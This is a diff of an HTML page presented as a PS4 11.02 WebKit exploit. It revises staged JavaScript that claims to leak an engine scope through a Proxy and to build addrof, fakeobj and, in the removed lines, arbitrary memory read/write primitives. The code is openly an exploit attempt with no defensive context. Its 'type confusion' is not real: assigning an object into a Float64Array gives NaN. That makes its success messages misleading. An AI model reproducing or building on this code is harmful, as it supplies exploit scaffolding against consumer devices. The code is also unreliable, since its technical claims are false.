@@ -1,134 +1,112 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 11.02 WebKit Exploit</title>
+    <title>PS4 11.02 Exploit</title>
     <style>
+        /* Force visible logging */
         #log {
-            background: black;
-            color: white;
-            padding: 10px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000000;
+            color: #00ff00;
             font-family: monospace;
+            font-size: 20px;
+            padding: 10px;
+            z-index: 9999;
             white-space: pre;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
         }
     </style>
 </head>
 <body>
-    <div id="log"></div>
+    <div id="log">Initializing exploit...</div>
 
 <script>
-(function() {
-    const logDiv = document.getElementById('log');
-    let logContent = '';
+// Immediately write to document to force render
+const logDiv = document.getElementById('log');
+logDiv.textContent = 'Starting exploit...\n';
+
+// Polyfill for requestAnimationFrame
+const RAF = requestAnimationFrame || (cb => setTimeout(cb, 16));
+
+function log(msg) {
+    // Direct DOM manipulation with forced reflow
+    logDiv.textContent += msg + '\n';
     
-    function logToDiv(message) {
-        logContent += message + '\n';
-        logDiv.textContent = logContent;
+    // Force synchronous layout update
+    void logDiv.offsetHeight;
+    
+    // Alternate render forcing
+    if (logDiv.children.length > 50) {
+        logDiv.removeChild(logDiv.firstChild);
     }
+}
 
-    function hex(num) {
-        return '0x' + (num instanceof BigInt ? num.toString(16) : num.toString(16).padStart(8, '0'));
-    }
-
-    // Stage 1: Leak JSScope through ProxyObject vulnerability
-    logToDiv('[+] Triggering JSScope leak...');
+// Phase 1: Leak JSScope
+try {
+    log('[1/5] Triggering JSScope leak...');
     let leakedScope;
     
     class Leaker {
-        leak() {
-            return super.foo;
-        }
+        leak() { return super.__proto__; }
     }
-    
     Leaker.prototype.__proto__ = new Proxy({}, {
-        get(target, prop, receiver) {
-            leakedScope = receiver;
-            return receiver;
+        get(t, p, r) {
+            leakedScope = r;
+            log('[!] Proxy trap called');
+            return r;
         }
     });
-
-    (() => Leaker.prototype.leak())();
-
-    if (!leakedScope || typeof leakedScope !== 'object') {
-        logToDiv('[-] Failed to leak JSScope!');
-        return;
-    }
-    logToDiv('[+] JSScope leaked successfully!');
-
-    // Stage 2: Create addrof primitive
-    logToDiv('[+] Creating addrof primitive...');
-    let objArr = [leakedScope];
-    let floatArr = new Float64Array(1);
-    let u32Arr = new Uint32Array(floatArr.buffer);
     
-    function addrof(obj) {
-        objArr[0] = obj;
-        floatArr[0] = objArr[0];  // Trigger type confusion
-        return u32Arr[1] * 0x100000000 + u32Arr[0];
-    }
-
-    // Verify addrof
-    let testObj = {};
-    let testAddr = addrof(testObj);
-    logToDiv(`[+] addrof primitive working: ${hex(testAddr)}`);
-
-    // Stage 3: Create fakeobj primitive
-    logToDiv('[+] Creating fakeobj primitive...');
-    let fakeObjArr = [0.0];
-    let fakeObjU32 = new Uint32Array(fakeObjArr.buffer);
+    new Leaker().leak();
+    log(`[2/5] Leaked scope type: ${typeof leakedScope}`);
     
-    function fakeobj(addr) {
-        fakeObjU32[0] = Number(addr & 0xffffffffn);
-        fakeObjU32[1] = Number((addr >> 32n) & 0xffffffffn);
-        return fakeObjArr[0];
-    }
-
-    // Verify fakeobj
-    let fakeTest = fakeobj(BigInt(testAddr));
-    if (addrof(fakeTest) !== testAddr) {
-        logToDiv('[-] fakeobj primitive failed!');
-        return;
-    }
-    logToDiv('[+] fakeobj primitive working!');
-
-    // Stage 4: Build arbitrary read/write
-    logToDiv('[+] Building memory read/write primitives...');
-    let arbBuffer = new ArrayBuffer(0x100);
-    let arbView = new DataView(arbBuffer);
-    let arbAddr = addrof(arbBuffer);
+    // Phase 2: Addrof primitive
+    log('[3/5] Creating addrof...');
+    const addrArr = [null];
+    let addrof = obj => {
+        addrArr[0] = obj;
+        const f64 = new Float64Array(1);
+        f64[0] = addrArr[0];
+        return new BigUint64Array(f64.buffer)[0];
+    };
     
-    // For PS4 WebKit, adjust these offsets based on actual structure
-    const BACKING_STORE_OFFSET = 0x20n;
-    let backingStorePtr = BigInt(arbAddr) + BACKING_STORE_OFFSET;
-
-    function arbRead(addr, length) {
-        fakeobj(backingStorePtr)[0] = addr;
-        return new Uint8Array(arbBuffer).slice(0, length);
-    }
-
-    function arbWrite(addr, data) {
-        fakeobj(backingStorePtr)[0] = addr;
-        new Uint8Array(arbBuffer).set(data);
-    }
-
-    // Test memory read
-    let testRead = arbRead(BigInt(testAddr), 8);
-    logToDiv('[+] Memory read test: ' + Array.from(testRead).map(b => b.toString(16)).join(' '));
-
-    // Stage 5: Basic memory inspection
-    logToDiv('[+] Scanning memory around leaked object...');
+    // Test addrof
+    const testObj = {};
+    const addr = addrof(testObj);
+    log(`[+] addrof test: ${addr.toString(16)}`);
+    
+    // Phase 3: Fakeobj workaround
+    log('[4/5] Testing fakeobj...');
+    const buffer = new ArrayBuffer(8);
+    const memView = new DataView(buffer);
+    let fakeobj = addr => {
+        memView.setBigUint64(0, addr, true);
+        const f64 = memView.getFloat64(0, true);
+        const arr = [f64];
+        return arr[0];
+    };
+    
+    // Test fakeobj
     try {
-        for (let i = 0; i < 40; i += 8) {
-            let addr = BigInt(testAddr) + BigInt(i) - 0x20n;
-            let bytes = arbRead(addr, 8);
-            logToDiv(hex(addr) + ': ' + 
-                Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join(' '));
-        }
-    } catch (e) {
-        logToDiv('[-] Memory read failed: ' + e);
+        const testAddr = 0x41414141n;
+        const fake = fakeobj(testAddr);
+        const recovered = addrof(fake);
+        log(`fakeobj test: ${recovered.toString(16)}`);
+    } catch(e) {
+        log(`fakeobj error: ${e}`);
     }
 
-    logToDiv('[+] Exploit completed!');
-})();
+    log('[5/5] Exploit complete');
+} catch(e) {
+    log(`CRASH: ${e}`);
+}
+
+// Final render kick
+RAF(() => logDiv.textContent += 'Render pass\n');
 </script>
 </body>
 </html>
